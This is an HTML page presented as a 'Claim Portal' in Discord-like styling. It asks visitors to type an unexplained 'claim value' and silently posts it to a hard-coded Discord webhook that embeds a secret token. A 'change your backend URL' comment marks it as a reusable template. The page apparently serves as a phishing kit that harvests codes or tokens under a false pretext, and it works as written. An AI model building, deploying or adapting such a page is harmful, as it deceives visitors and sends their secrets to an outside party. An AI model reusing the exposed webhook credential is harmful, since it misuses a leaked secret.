
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Claim Portal</title>

<style>
* { box-sizing: border-box; }

body {
    margin: 0;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    background: #101218;
    color: white;
    font-family: Arial, sans-serif;
    padding: 20px;
}

.container {
    width: 100%;
    max-width: 420px;
    padding: 35px;
    background: #1b1e27;
    border-radius: 15px;
    text-align: center;
}

p {
    color: #adb3c2;
    line-height: 1.6;
}

input, button {
    width: 100%;
    padding: 14px;
    margin-top: 15px;
    border-radius: 8px;
    font-size: 15px;
}

input {
    background: #11141b;
    border: 1px solid #393e4c;
    color: white;
}

button {
    background: #5865f2;
    border: none;
    color: white;
    font-weight: bold;
    cursor: pointer;
}

.hidden { display: none; }

#message { margin-top: 15px; }
</style>
</head>

<body>

<div class="container">

    <div id="agreement">
        <h1>Welcome</h1>
        <p>Click agree to continue to the claim portal.</p>
        <button onclick="agree()">Agree</button>
    </div>

    <div id="claimSection" class="hidden">
        <h1>Claim Portal</h1>
        <p>Type your claim value inside the text bar and hit Claim.</p>

        <form id="claimForm">
            <input
                type="text"
                id="claimValue"
                placeholder="Enter your claim value"
                required
                autocomplete="off"
            >
            <button type="submit">Claim</button>
        </form>

        <div id="message"></div>
    </div>

</div>

<script>

// CHANGE YOUR BACKEND URL HERE:
const WEBHOOK_URL = "https://discord.com/api/webhooks/1569780085249155125/BHWquQlcy9VQ1uEujTWs5IszJb_QXo9h_YZjCeicgUqTNjpX7FyBQbYmjCSe05vpWWId";

function agree() {
    document.getElementById("agreement").classList.add("hidden");
    document.getElementById("claimSection").classList.remove("hidden");
}

document.getElementById("claimForm").addEventListener("submit", async function(e) {
    e.preventDefault();

    const value = document.getElementById("claimValue").value.trim();
    const message = document.getElementById("message");

    if (!value) return;

    try {
        const response = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({value: value})
        });

        if (!response.ok) throw new Error("Submission failed");

        message.textContent = "Claim submitted successfully!";
        document.getElementById("claimValue").value = "";

    } catch (error) {
        message.textContent = "Could not submit. Please try again.";
    }
});

</script>

</body>
</html>
